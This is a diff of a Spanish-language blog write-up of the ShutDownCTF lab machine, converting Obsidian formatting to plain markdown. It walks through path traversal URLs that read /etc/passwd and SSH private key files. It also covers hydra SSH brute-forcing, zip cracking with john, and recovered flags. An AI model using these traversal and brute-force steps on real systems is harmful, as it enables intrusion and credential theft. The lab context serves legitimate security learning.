@@ -9,28 +9,27 @@ published: true
 tags:
   - CTF
   - estado/completado
-plataforma: "[[DeliciousHack]]"
-dificultad: Fácil
-autor: "[[ShellDredd]]"
+  - plataforma: [[DeliciousHack]]
+  - dificultad: Fácil
+  - autor: [[ShellDredd]]
 ---
 
 # Datos
 
-> [!INFO] CTF
->  **Nombre:** ShutDownCTF
->  **SO:** Linux
->  **Dificultad:** Fácil  
->  **Creador:**  [[ShellDredd|ShellDredd]]
->  **Descargar**: [CTF SHUTDOWN](https://delicioushack.com/shutdown.html)
-^descripcion
+[!INFO] CTF
+  -   **Nombre:** ShutDownCTF
+  -  **SO:** Linux
+  -  **Dificultad:** Fácil  
+  -   **Creador:**  [[ShellDredd|ShellDredd]]
+  -  **Descargar**: [CTF SHUTDOWN](https://delicioushack.com/shutdown.html)
 
-> [!TIP] Objetivo
-> **IP Address:** 10.6.6.55
-> 
-> **Obtener las flags:** 
->> 🚩 user.txt 
->> 🚩 root.txt|
-^objetivo
+[!TIP] Objetivo
+
+**IP Address:** 10.6.6.55
+
+**Obtener las flags:** 
+  -  🚩 user.txt 
+  -  🚩 root.txt|
 
 # Reconocimiento
 
@@ -53,19 +52,19 @@ PORT     STATE SERVICE REASON         VERSION
 MAC Address: 08:00:27:E2:EA:39 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 # Anotaciones
 
-> [!FAQ] Observaciones
-> El escaneo muestra 3 puertos abiertos:
->> **Puerto 23 con servicio telnet**
->> 	* *Versión:*  Linux telnetd
->> **Puerto 80 con servicio apache**
->> 	* *Versión:* httpd 2.4.56 
->> **Puerto 6969 con servicio ssh**
->> 	* *Versión:* OpenSSH 8.4p1
->> 
+[!FAQ] Observaciones
+El escaneo muestra 3 puertos abiertos:
+**Puerto 23 con servicio telnet**
+*Versión:*  Linux telnetd
+**Puerto 80 con servicio apache**
+*Versión:* httpd 2.4.56 
+**Puerto 6969 con servicio ssh**
+*Versión:* OpenSSH 8.4p1
 
-> [!DANGER] ¡Atento! La imagen de fondo muestra la siguiente palabra: `theriddle`
+[!DANGER] ¡Atento! La imagen de fondo muestra la siguiente palabra: `theriddle`
 
 Lo primero que intento realizar es ver si me puedo conectar como usuario `anonymous` por telnet, y al intentarlo veo que no puedo, que solicita usuario y contraseña, datos que aun no tengo.
 
@@ -82,27 +81,27 @@ Algo más que intento realizar es escanear la web, realizar fuzzing y para ello 
 /.htm                 (Status: 403) [Size: 274]
 /.php                 (Status: 403) [Size: 274]
 /server-status        (Status: 403) [Size: 274]
-
 ```
 
 Al parecer existe un directorio llamado `wp-admin` lo que indica que muy probablemente este ante un Wordpress, sin embargo al ingresar al directorio, me encuentro con esto:
 
-![[wp-adminCTFShutD.png]]
+![wp-adminCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/wp-adminCTFShutD.png)
 
-¡Esto indica que no es un Wordpress! En el escaneo también veo el directorio: `/blade`que solo contiene las imágenes de la web, intento buscar metadatos en estas imágenes y no contienen información importante.
+¡Esto indica que no es un Wordpress! En el escaneo también veo el directorio: `/blade` que solo contiene las imágenes de la web, intento buscar metadatos en estas imágenes y no contienen información importante.
 
-![[MetaDatosCTFShutD.png]]
+![MetaDatosCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/MetaDatosCTFShutD.png)
 
 ___
-> [!WARNING] ¡Bloqueado!
-> A este punto ya me encontraba bloqueado, no sabia por donde continuar, así que procedo a chequear un poco del WriteUps.
->> **Cabecera (header)**
->> Se menciona que la clave esta en fijarnos en el header de los archivos y esto lo hago con el comando: `curl -I URL` eso fue lo que he realizado y el resultado fue que se puede ejecutar comandos en el sistema, con la función `php_GET:system($shell)`, usando la variable `$shell`, por lo tanto esto es un [[Path Traversal]] 
-> ![[/adjuntos/CurlCTFShutD.png]]
-> ```text
-> Lección aprendida: 
-> Siempre fijarse en las cabeceras de los archivos
-> ```
+  - [!WARNING] ¡Bloqueado!
+  -  A este punto ya me encontraba bloqueado, no sabia por donde continuar, así que procedo a chequear un poco del WriteUps.
+  -  **Cabecera (header)**
+  -  Se menciona que la clave esta en fijarnos en el header de los archivos y esto lo hago con el comando: `curl -I URL` eso fue lo que he realizado y el resultado fue que se puede ejecutar comandos en el sistema, con la función `php_GET:system($shell)`, usando la variable `$shell`, por lo tanto esto es un [[Path Traversal]] 
+  -  ![CurlCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/CurlCTFShutD.png)
+
+```text
+Lección aprendida: 
+Siempre fijarse en las cabeceras de los archivos
+```
 -----
 
 Ya con esta información procedo a realizar el típico:
@@ -112,7 +111,7 @@ Ya con esta información procedo a realizar el típico:
 Y la verdad, luego de estar bloqueado, el conseguir este resultado fue como ver la luz al final del túnel, pero solo era un escalón, se tenia que continuar… 
 El resultado obtenido, es el siguiente:
 
-![[adjuntos/EtcPasswdCTFShutD.png]]
+![EtcPasswdCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/EtcPasswdCTFShutD.png)
 
 Procedo a utilizar `curl` para hacer legible la información o incluso podría verlo desde el código fuente para ver mejor el contenido y con ello, me doy cuenta que existe el usuario `administrator` y se encuentra su carpeta de usuario en: `/home/administrator` 
 
@@ -147,8 +146,8 @@ debian-tor:x:107:114::/var/lib/tor:/bin/false
 administrator:x:1001:1001::/home/administrator:/bin/bash
 ```
 
-> [!INFO] Consultado id_rsa del usuario
->  Algo que rápidamente intento es consultar el archivo `id_rsa` del usuario `administrator` en la ruta: `/home/administrator/.ssh/id_rsa` ya que el `servicio ssh` esta abierto en el `puerto 6969`
+[!INFO] Consultado id_rsa del usuario
+  -  Algo que rápidamente intento es consultar el archivo `id_rsa` del usuario `administrator` en la ruta: `/home/administrator/.ssh/id_rsa` ya que el `servicio ssh` esta abierto en el `puerto 6969`
 
 **Seria así:**
 
@@ -156,7 +155,7 @@ administrator:x:1001:1001::/home/administrator:/bin/bash
 
 Y obtenemos el siguiente resultado:
 
-![[../IdRsaCTFShutD.png]]
+![IdRsaCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/IdRsaCTFShutD.png)
 
 Organizando un poco la información:
 
@@ -174,9 +173,11 @@ Organizando un poco la información:
 Como ya sabrás después del día de presentación, el servidor de DeliciousHack tiene deshabilitado SSH por ahora, así que tendrás que utilizar TELNET, pero no hagas como tu compañero de práticas, que no recordaba la contraseña y utilizó fuerza bruta para entrar... Nos dejó logs en el monitoreo y se quejaron los de SOC1... Espero que no rompas nada en mis días de vacaciones. Un saludo, Raimundo[Admin Senior]
 ```
 
-> [!DANGER] [[ShellDredd]] si llegas a leer esto, te quiero decir lo siguiente:
-> ![[/blog/_posts/adjuntos/TeOdioCTFShutD.png]]
-> ¿Por que complicas todo? xD
+[[ShellDredd]] si llegas a leer esto, te quiero decir lo siguiente:
+
+![TeOdioCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/TeOdioCTFShutD.png)
+
+  - ¿Por que complicas todo? xD
 
 Del mensaje mostrado, puedo sacar lo que podría ser algunas claves:
 - Usuarios posibles: `junior`, `raimundo`
@@ -250,15 +251,16 @@ Así que la contraseña privada de SSH, podría no ser: `id_rsa`, si no: `id_ed2
 
 `http://10.6.6.55/_wp-admin.php?shell=../../../../../../../../../../../../../home/administrator/.ssh/id_ed25519` también intentamos consultar: `known_hosts` pero esta vació.
 
-> **¡Otro intento fallido!**
+  - **¡Otro intento fallido!**
 
 Sin embargo, tomando aire, estirándome un poco, pienso; _¿cual es mi objetivo?_ Así que recuerdo que es obtener la `flag de user` y esta normalmente se encuentra en el `home` del usuario, así que podría intentar consultar este archivo directamente.
 
-> [!INFO] Consultando flag del usuario
->  Primero intente consultando: `/home/administrator/flag.txt`
->  Luego intente: `/home/administrator/user.txt` (Obtenido :obs_checkmark: )
+[!INFO] Consultando flag del usuario
+  -  Primero intente consultando: `/home/administrator/flag.txt`
+  -  Luego intente: `/home/administrator/user.txt` (Obtenido)
 
 # Análisis de vulnerabilidades
+
 ## Flag de usuario 
 
 **¡Y listo!** - Que genial, primer paso logrado.
@@ -290,10 +292,11 @@ flag{QnVzY2EgdHUgbWlzbW8gbGEgZmxhZw==}
 ---------------------------------------
 ```
 
-> Intentemos algo, que es probable no funcione..
-> `http://10.6.6.55/_wp-admin.php?shell=../../../../../../../../../../../../../root/root.txt`
-> 
-> **¡En efecto… No funciono!** :(
+  - Intentemos algo, que es probable no funcione..
+
+`http://10.6.6.55/_wp-admin.php?shell=../../../../../../../../../../../../../root/root.txt`
+
+**¡En efecto… No funciono!** :(
 
 # Explotación de vulnerabilidades
 
@@ -301,18 +304,20 @@ Uno de los primeros intentos fue realizar un ataque de fuerza bruta con `hydra` 
 
 `hydra -l administrator -P /usr/share/wordlists/rockyou.txt ssh://10.6.6.55:6969`
 
-> **¡Y siiiiiii… Oh yeah! Objetivo conseguido.**
-> ![[HydraSSHCTFShutD.png]]
+  - **¡Y siiiiiii… Oh yeah! Objetivo conseguido.**
+
+![HydraSSHCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/HydraSSHCTFShutD.png)
+
 ``` bash
  [STATUS] 135.00 tries/min, 135 tries in 00:01h, 14344246 to do in 1770:54h, 15 active
 [6969][ssh] host: 10.6.6.55   login: administrator   password: RGViZXMgb2J0ZW5lcmxhIHR1IG1pc21v 
 ```
 
-> También intente un ataque de fuerza bruta al servicio ssh con el usuario root, pero sin buenos resultados.
+  - También intente un ataque de fuerza bruta al servicio ssh con el usuario root, pero sin buenos resultados.
 
 ##### ¡Estamos dentro!
 
-![[EstamosDentroCTFShutD.png]]
+![EstamosDentroCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/EstamosDentroCTFShutD.png)
 
 # Escalada de privilegios
 
@@ -350,15 +355,15 @@ administrator@shutdown:~$ cat manual
 
 ```
 
-> [!DANGER] ¡Nueva aventura!
-> ¿Sera este archivo comprimido un rabbit hole? 🐰
+[!DANGER] ¡Nueva aventura!
+  - ¿Sera este archivo comprimido un rabbit hole? 🐰
 
 Al consultar el directorio indicado: `/opt/recursos` encuentro en efecto un archivo llamado: `g-accesos.zip` sin embargo, ¿estará realmente allí los datos de acceso que necesito?, ¿enviar un correo para obtener la contraseña?….
 
-> Intente algunas cosas primeros, por ejemplo:
+  - Intente algunas cosas primeros, por ejemplo:
 
 Primero buscar archivos con permisos -4000, archivos SUID
-`find / -perm -4000 2>/dev/null`
+  - `find / -perm -4000 2>/dev/null`
 
 Resultado:
 ```
@@ -378,28 +383,28 @@ Resultado:
 Así que ingresando en `gtfobins.github.io` realizo una comprobación de cada uno de los binarios para ver si puedo elevar privilegios con este método, pero sin buenos resultados.
 
 Luego de intento otras cosas como:
-> `sudo -l` 
-> `chmod u+s /bin/bash`
-> `env`
+  - `sudo -l` 
+  - `chmod u+s /bin/bash`
+  - `env`
 
 Luego de intentar y probar varias cosas, sin buenos resultados, pues me resigno e intento ver el contenido de `g-accesos.zip` en este caso prefiero descargar de forma local el archivo, podría hacerlo con ssh, pero para mas rápido, intento hacerlo con un servidor web usando python.
 
-![[DescargarAccesosCTFShutD.png]]
+![DescargarAccesosCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/DescargarAccesosCTFShutD.png)
 
 Y efectivamente, es un archivo comprimido en zip, que tiene un archivo llamado `accesos` el cual tiene buena pinta, vamos a intentar sacar su contraseña:
 
-![[g-accesosCTFShutD.png]]
+![g-accesosCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/g-accesosCTFShutD.png)
 
 #### ¡John The Ripper! Yo te invoco
 
-> **(Decepción tota)" Al final fue mucho mas fácil de lo esperado.**
->Tenia que haber empezando por aquí desde un principio.
->
->> **¿Que pasos he realizado?**
->> Usando `zip2john`le indico el archivo comprimido `g-accesos.zip` para que me genere un `hash` del mismo del archivo.
->> Luego teniendo este `hash` le paso el diccionario `rockyou.txt` a `john` para que devuelva la contraseña.
+**(Decepción total conmigo) - Al final fue mucho mas fácil de lo esperado.**
+  - Tenia que haber empezando por aquí desde un principio.
 
-![[CrackearZipCTFShutD.png]]
+**¿Que pasos he realizado?**
+  - Usando `zip2john`le indico el archivo comprimido `g-accesos.zip` para que me genere un `hash` del mismo del archivo.
+  - Luego teniendo este `hash` le paso el diccionario `rockyou.txt` a `john` para que devuelva la contraseña.
+
+![CrackearZipCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/CrackearZipCTFShutD.png)
 
 Resultado obtenido:
 
@@ -419,30 +424,27 @@ Y luego de colocar la contraseña en el archivo comprimido y acceder al archivo 
 
 # PWNED
 
-![[pwnedCTFShutD.png]]
+![pwnedCTFShutD.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/pwnedCTFShutD.png)
 
 # Bandera(s)
 
-> [!FLAG] 
-> `User=flag{RGViZXMgb2J0ZW5lcmxhIHR1IG1pc21v}`
-> `Root=flag{QnVzY2EgdHUgbWlzbW8gbGEgZmxhZw==}`
-^bandera
+[!FLAG] 
+  - `User=flag{RGViZXMgb2J0ZW5lcmxhIHR1IG1pc21v}`
+  -  `Root=flag{QnVzY2EgdHUgbWlzbW8gbGEgZmxhZw==}`
 
 # Comandos
 
-> [!IMPORTANT] Resumen de comandos utilizados
-> :luc_terminal: `nmap -p- --open -sC -sS -sV min-rate=5000 -n -vvv -Pn 10.6.6.55`
-> :luc_terminal: `gobuster dir -u http://10.6.6.52/ -t 400 -w /directory-list-2.3-medium.txt`
-> :luc_terminal: `exiftool {NombreIMG}.jpg`
-> :luc_terminal: `curl -I http://10.6.6.55/_wp-admin.php`
-> :luc_terminal: `http://IP/_wp-admin.php?shell=../../etc/passwd`
-> :luc_terminal: `http://IP/_wp-admin.php?shell=../../home/administrator/.ssh/id_rsa`
-> :luc_terminal: `http://IP/_wp-admin.php?shell=../../home/administrator/user.txt`
-> :luc_terminal: `hydra -l administrator -P rockyou.txt ssh://10.6.6.55:6969`
-> :luc_terminal: `zip2john g-accesos > hash`
-> :luc_terminal: `john --wordlist=rockyou.txt hash`
->
-^comandos
+[!IMPORTANT] Resumen de comandos utilizados
+  - `nmap -p- --open -sC -sS -sV min-rate=5000 -n -vvv -Pn 10.6.6.55`
+  - `gobuster dir -u http://10.6.6.52/ -t 400 -w /directory-list-2.3-medium.txt`
+  - `exiftool {NombreIMG}.jpg`
+  - `curl -I http://10.6.6.55/_wp-admin.php`
+  - `http://IP/_wp-admin.php?shell=../../etc/passwd`
+  - `http://IP/_wp-admin.php?shell=../../home/administrator/.ssh/id_rsa`
+  - `http://IP/_wp-admin.php?shell=../../home/administrator/user.txt`
+  - `hydra -l administrator -P rockyou.txt ssh://10.6.6.55:6969`
+  - `zip2john g-accesos > hash`
+  - `john --wordlist=rockyou.txt hash`
 
 
 ```
